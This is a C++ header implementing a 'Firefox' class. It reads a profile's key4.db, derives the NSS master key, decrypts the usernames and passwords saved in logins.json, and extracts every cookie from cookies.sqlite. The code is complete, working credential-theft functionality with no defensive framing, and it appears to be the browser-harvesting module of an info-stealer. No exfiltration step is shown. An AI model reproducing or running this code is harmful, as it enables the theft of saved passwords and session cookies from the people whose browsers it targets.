
#pragma once

#include <iostream>
#include <string>
#include <vector>
#include <list>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <istream>
#include <botan/hmac.h>
#include <botan/sha160.h>
#include <botan/hash.h>
#include <botan/base64.h>
#include <botan/ber_dec.h>
#include <botan/hex.h>
#include <botan/asn1_obj.h>
#include <filesystem>
#include <nlohmann/json.hpp>
#include <botan/pbkdf.h>
#include <botan/pbkdf2.h>
#include <botan/cipher_mode.h>
#include <sqlite3.h>
#include <botan/symkey.h>
#include <botan/secmem.h>
#include <botan/bigint.h>
#include <botan/mode_pad.h>
#include <ShlObj.h>
#include "structures.hpp"
#include <kubazip/zip/zip.h>

#pragma comment (lib, "botan.lib")

namespace Core
{
    class Firefox {
    private:
        static Botan::secure_vector<uint8_t> decrypt3DES(std::vector<uint8_t> globalSalt, Botan::secure_vector<uint8_t> entrySalt, Botan::secure_vector<uint8_t> encryptedData)
        {
            try
            {
                std::unique_ptr<Botan::HashFunction> hash = Botan::HashFunction::create("SHA-1");
                Botan::secure_vector<uint8_t> hp = hash->process(globalSalt);
                Botan::secure_vector<uint8_t> pes(entrySalt.begin(), entrySalt.end());
                if (20 - entrySalt.size() > 0)
                {
                    pes.insert(pes.end(), 20 - entrySalt.size(), 0);
                }
                hp.insert(hp.end(), entrySalt.begin(), entrySalt.end());
                Botan::secure_vector<uint8_t> chp = Botan::HashFunction::create("SHA-1")->process(hp);
                Botan::HMAC hmac(hash.release());
                hmac.set_key(chp);

                Botan::secure_vector<uint8_t> pes_tmp(pes.begin(), pes.end());
                pes_tmp.insert(pes_tmp.end(), entrySalt.begin(), entrySalt.end());

                Botan::secure_vector<uint8_t> k1 = hmac.process(pes_tmp);
                Botan::secure_vector<uint8_t> tk = hmac.process(pes);

                tk.insert(tk.end(), entrySalt.begin(), entrySalt.end());
                Botan::secure_vector<uint8_t> k2 = hmac.process(tk);

                k1 += k2;
                std::vector<uint8_t> iv(k1.end() - 8, k1.end());
                std::vector<uint8_t> key(k1.begin(), k1.begin() + 24);

                std::unique_ptr<Botan::Cipher_Mode> des3_cbc = Botan::Cipher_Mode::create("3DES/CBC/NoPadding", Botan::DECRYPTION);
                des3_cbc->set_key(key);
                des3_cbc->start(iv);
                des3_cbc->finish(encryptedData);

                return encryptedData;
            }
            catch (const std::exception&)
            {
                return {};
            }
        }

        static std::tuple<Botan::secure_vector<uint8_t>, Botan::secure_vector<uint8_t>, Botan::secure_vector<uint8_t>> decodeLoginData(std::string data)
        {
            try
            {
                Botan::secure_vector<uint8_t> sc = Botan::base64_decode(data);
                std::vector<uint8_t> decoded(sc.begin(), sc.end());
                Botan::BER_Object temp;
                Botan::BER_Decoder decoder(decoded);
                Botan::secure_vector<uint8_t> key_id, iv, ciphertext;
                decoder.start_cons(Botan::SEQUENCE)
                    .decode(key_id, Botan::OCTET_STRING)
                    .start_cons(Botan::SEQUENCE)
                    .get_next(temp)
                    .decode(iv, Botan::OCTET_STRING)
                    .end_cons()
                    .decode(ciphertext, Botan::OCTET_STRING)
                    .end_cons();

                return make_tuple(key_id, iv, ciphertext);
            }
            catch (const std::exception&)
            {
                return {};
            }
        }

        static std::tuple<Botan::secure_vector<uint8_t>, std::string> decryptMasterPass(std::vector<uint8_t> itemData, std::vector<uint8_t> globalSalt)
        {
            Botan::BER_Decoder decodedItem(itemData);
            Botan::OID pbeAlgo;
            decodedItem.start_cons(Botan::SEQUENCE)
                .start_cons(Botan::SEQUENCE)
                .decode(pbeAlgo)
                .discard_remaining();

            if (pbeAlgo.to_string() == "1.2.840.113549.1.12.5.1.3")
            {
                Botan::BER_Decoder decodedItem(itemData);
                Botan::secure_vector<uint8_t> entrySalt, cipherT;
                Botan::BER_Object temp;
                decodedItem.start_cons(Botan::SEQUENCE)
                    .start_cons(Botan::SEQUENCE)
                    .get_next(temp)
                    .start_cons(Botan::SEQUENCE)
                    .decode(entrySalt, Botan::OCTET_STRING)
                    .get_next(temp)
                    .end_cons()
                    .end_cons()
                    .decode(cipherT, Botan::OCTET_STRING)
                    .end_cons();

                Botan::secure_vector<uint8_t> key = decrypt3DES(globalSalt, entrySalt, cipherT);
                if (key.size() > 24)
                {
                    Botan::secure_vector<uint8_t> key_truncated(key.begin(), key.begin() + 24);
                    return make_tuple(key_truncated, pbeAlgo.to_string());
                }
                return make_tuple(key, pbeAlgo.to_string());
            }
            else if (pbeAlgo.to_string() == "1.2.840.113549.1.5.13")
            {
                Botan::BER_Decoder decodedItem(itemData);
                Botan::BER_Object temp;
                Botan::OID object_id_1, object_id_2, object_id_3;
                std::vector<uint8_t> entrySalt, temp_iv, cipherT;
                int iterationCount, keyLength;

                decodedItem.start_cons(Botan::SEQUENCE)
                    .start_cons(Botan::SEQUENCE)
                    .get_next(temp)
                    .start_cons(Botan::SEQUENCE)
                    .start_cons(Botan::SEQUENCE)
                    .decode(object_id_1)
                    .start_cons(Botan::SEQUENCE)
                    .decode(entrySalt, Botan::OCTET_STRING)
                    .decode_integer_type(iterationCount)
                    .decode_integer_type(keyLength)
                    .start_cons(Botan::SEQUENCE)
                    .decode(object_id_2)
                    .end_cons()
                    .end_cons()
                    .end_cons()
                    .start_cons(Botan::SEQUENCE)
                    .decode(object_id_3)
                    .decode(temp_iv, Botan::OCTET_STRING)
                    .end_cons()
                    .end_cons()
                    .end_cons()
                    .decode(cipherT, Botan::OCTET_STRING)
                    .end_cons()
                    .discard_remaining();

                if (object_id_1.to_string() != "1.2.840.113549.1.5.12" || object_id_2.to_string() != "1.2.840.113549.2.9" || object_id_3.to_string() != "2.16.840.1.101.3.4.1.42" || keyLength != 32) {
                    return {};
                }

                Botan::SHA_160 sha1;
                Botan::SecureVector<uint8_t> k = sha1.process(globalSalt);
                Botan::PBKDF* pbkdf = Botan::get_pbkdf("PBKDF2(SHA-256)");
                std::string k_str(k.begin(), k.end());
                Botan::SymmetricKey key = pbkdf->derive_key(keyLength, secVecToString(k), entrySalt, iterationCount);
                delete pbkdf;

                Botan::SecureVector<uint8_t> keyBytes(key.begin(), key.end());

                std::vector<uint8_t> iv{ '\x04', '\x0e' };
                iv.insert(iv.end(), temp_iv.begin(), temp_iv.end());
                std::unique_ptr<Botan::Cipher_Mode> dec =
                    Botan::Cipher_Mode::create("AES-256/CBC/NoPadding", Botan::Cipher_Dir::DECRYPTION);
                dec->set_key(key);
                Botan::secure_vector<uint8_t> tmpPlainText(cipherT.begin(), cipherT.end());
                dec->start(iv);
                dec->finish(tmpPlainText);

                if (tmpPlainText.size() > 24)
                {
                    Botan::secure_vector<uint8_t> tmpPlainText_truncated(tmpPlainText.begin(), tmpPlainText.begin() + 24);
                    return make_tuple(tmpPlainText_truncated, pbeAlgo.to_string());
                }
                return make_tuple(tmpPlainText, pbeAlgo.to_string());
            }
            return {};
        }

    public:

        static std::string secVecToString(Botan::secure_vector<uint8_t>& vec)
        {
            return std::string(reinterpret_cast<const char*>(vec.data()), vec.size());
        }

        static std::string vecToString(std::vector<uint8_t>& vec)
        {
            return std::string(reinterpret_cast<const char*>(vec.data()), vec.size());
        }

        static std::list<Logins> getLoginData(std::filesystem::path directory)
        {
            try
            {
                std::list<Logins> logins;
                std::filesystem::path json_file = directory / "logins.json";
                if (!std::filesystem::exists(json_file)) {
                    return {};
                }
                std::ifstream infile(json_file);
                nlohmann::json jsonLogins;
                infile >> jsonLogins;
                if (!jsonLogins.contains("logins"))
                {
                    return {};
                }
                for (const auto& row : jsonLogins["logins"])
                {
                    Logins tmp;
                    std::string encUsername = row["encryptedUsername"];
                    std::string encPassword = row["encryptedPassword"];
                    std::string hostname = row["hostname"];
                    tmp.tuple_Username = decodeLoginData(encUsername);
                    tmp.tuple_Password = decodeLoginData(encPassword);
                    tmp.hostname = hostname;
                    logins.push_back(tmp);
                }
                return logins;
            }
            catch (const std::exception&)
            {
                return {};
            }
        }

        static std::tuple<Botan::secure_vector<uint8_t>, std::string> getKey(std::filesystem::path directory)
        {
            try
            {
                std::tuple<Botan::secure_vector<uint8_t>, std::string> result;
                sqlite3* db;
                int it = sqlite3_open((directory / "key4.db").string().c_str(), &db);
                if (it != SQLITE_OK) {
                    return {};
                }
                // Execute query to fetch password
                sqlite3_stmt* stmt;
                it = sqlite3_prepare_v2(db, "SELECT item1,item2 FROM metadata WHERE id = 'password';", -1, &stmt, nullptr);
                if (it != SQLITE_OK) {
                    sqlite3_close(db);
                    return {};
                }
                sqlite3_step(stmt);

                int blobSize = sqlite3_column_bytes(stmt, 0);
                std::vector<uint8_t> globalSalt(blobSize);
                memcpy(globalSalt.data(), sqlite3_column_blob(stmt, 0), blobSize);

                blobSize = sqlite3_column_bytes(stmt, 1);
                std::vector<uint8_t> item2(blobSize);
                memcpy(item2.data(), sqlite3_column_blob(stmt, 1), blobSize);
                result = decryptMasterPass(item2, globalSalt);

                Botan::secure_vector<uint8_t> compare = { 'p', 'a', 's', 's', 'w', 'o', 'r', 'd', '-', 'c', 'h', 'e', 'c', 'k', '\x02', '\x02' };
                if (std::get<0>(result) == compare)
                {
                    sqlite3_prepare_v2(db, "SELECT a11,a102 FROM nssPrivate;", -1, &stmt, nullptr);
                    while (sqlite3_step(stmt) == SQLITE_ROW)
                    {
                        blobSize = sqlite3_column_bytes(stmt, 0);
                        std::vector<uint8_t> a11(blobSize);
                        memcpy(a11.data(), sqlite3_column_blob(stmt, 0), blobSize);

                        blobSize = sqlite3_column_bytes(stmt, 1);
                        std::vector<uint8_t> a102(blobSize);
                        memcpy(a102.data(), sqlite3_column_blob(stmt, 1), blobSize);
                        std::vector<uint8_t> CKA_ID = { 0xf8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01 };
                        if (a102 == CKA_ID)
                        {
                            result = decryptMasterPass(a11, globalSalt);
                            break;
                        }
                    }
                }
                sqlite3_finalize(stmt);
                sqlite3_close(db);
                return result;
            }
            catch (const std::exception&)
            {
                return {};
            }
        }

        static DecryptedLogins getDecryptedLogins(std::tuple<Botan::secure_vector<uint8_t>, std::string> key_algo, std::list<Logins> logins, int profileNum)
        {
            if (logins.empty() || std::get<0>(key_algo).empty()) {
                return DecryptedLogins{};
            }
            try
            {
                DecryptedLogins decryptedLogins;
                decryptedLogins.fireProfile = std::to_string(profileNum);
                for (Logins i : logins)
                {
                    std::vector<uint8_t> CKA_ID = { 0xf8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01 };
                    if (std::get<0>(i.tuple_Username) != CKA_ID) {
                        continue;
                    }
                    Botan::secure_vector<uint8_t> iv = std::get<1>(i.tuple_Username);
                    Botan::secure_vector<uint8_t> ciphertext = std::get<2>(i.tuple_Username);

                    std::unique_ptr<Botan::Cipher_Mode> des3_cbc_login = Botan::Cipher_Mode::create("3DES/CBC/PKCS7", Botan::DECRYPTION);
                    std::unique_ptr<Botan::Cipher_Mode> des3_cbc_pass = Botan::Cipher_Mode::create("3DES/CBC/PKCS7", Botan::DECRYPTION);
                    Botan::PKCS7_Padding padding_L, padding_P;

                    des3_cbc_login->set_key(std::get<0>(key_algo));
                    des3_cbc_login->start(iv);
                    des3_cbc_login->finish(ciphertext);
                    uint8_t* input_L = ciphertext.data();
                    size_t input_length_L = ciphertext.size();
                    size_t unpadded_length = padding_L.unpad(input_L, input_length_L);
                    std::vector<uint8_t> decrypt_login(unpadded_length);
                    copy(input_L, input_L + unpadded_length, decrypt_login.begin());

                    iv = std::get<1>(i.tuple_Password);
                    ciphertext = std::get<2>(i.tuple_Password);
                    des3_cbc_pass->set_key(std::get<0>(key_algo));
                    des3_cbc_pass->start(iv);
                    des3_cbc_pass->finish(ciphertext);
                    uint8_t* input_P = ciphertext.data();
                    size_t input_length_P = ciphertext.size();
                    unpadded_length = padding_P.unpad(input_P, input_length_P);
                    std::vector<uint8_t> decrypt_pass(unpadded_length);
                    copy(input_P, input_P + unpadded_length, decrypt_pass.begin());

                    decryptedLogins.hostname.push_back(i.hostname);
                    decryptedLogins.login.push_back(vecToString(decrypt_login));
                    decryptedLogins.password.push_back(vecToString(decrypt_pass));
                }

                if (decryptedLogins.hostname.empty())
                    return DecryptedLogins{};
                else
                    return decryptedLogins;
            }
            catch (const std::exception&)
            {
                return DecryptedLogins{};
            }
        }

        static Cookies getCookie(std::filesystem::path directory, int profileNum)
        {
            try
            {
                sqlite3* db;
                int result = sqlite3_open((directory / "cookies.sqlite").string().c_str(), &db);
                if (result != SQLITE_OK) {
                    return Cookies{};
                }
                sqlite3_stmt* stmt;
                result = sqlite3_prepare_v2(db, "SELECT host, isHttpOnly, path, isSecure, expiry, name, value FROM moz_cookies;", -1, &stmt, nullptr);
                if (result != SQLITE_OK) {
                    sqlite3_close(db);
                    return Cookies{};
                }
                result = sqlite3_step(stmt);
                if (result == SQLITE_DONE) {
                    // The table is empty
                    sqlite3_finalize(stmt);
                    sqlite3_close(db);
                    return Cookies{};
                }
                Cookies cookies;
                cookies.fireProfile = std::to_string(profileNum);
                while (result == SQLITE_ROW)
                {
                    std::string is_httponly, is_secure;
                    std::string host_key = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    if (sqlite3_column_int64(stmt, 1) == 1)
                        is_httponly = "TRUE";
                    else if (sqlite3_column_int64(stmt, 1) == 0)
                        is_httponly = "FALSE";
                    else
                        is_httponly = "UNKNOWN";
                    std::string path = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));
                    if (sqlite3_column_int64(stmt, 3) == 1)
                        is_secure = "TRUE";
                    else if (sqlite3_column_int64(stmt, 3) == 0)
                        is_secure = "FALSE";
                    else
                        is_secure = "UNKNOWN";
                    int64_t expires_utc = sqlite3_column_int64(stmt, 4);
                    std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 5));
                    std::string value = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 6));

                    cookies.hostkey.push_back(host_key);
                    cookies.httponly.push_back(is_httponly);
                    cookies.path.push_back(path);
                    cookies.secure.push_back(is_secure);
                    cookies.expires_utc.push_back(expires_utc);
                    cookies.name.push_back(name);
                    cookies.value.push_back(value);

                    result = sqlite3_step(stmt);
                }
                sqlite3_finalize(stmt);
                sqlite3_close(db);

                return cookies;
            }
            catch (const std::exception&)
            {
                return Cookies{};
            }
        }

    };

}
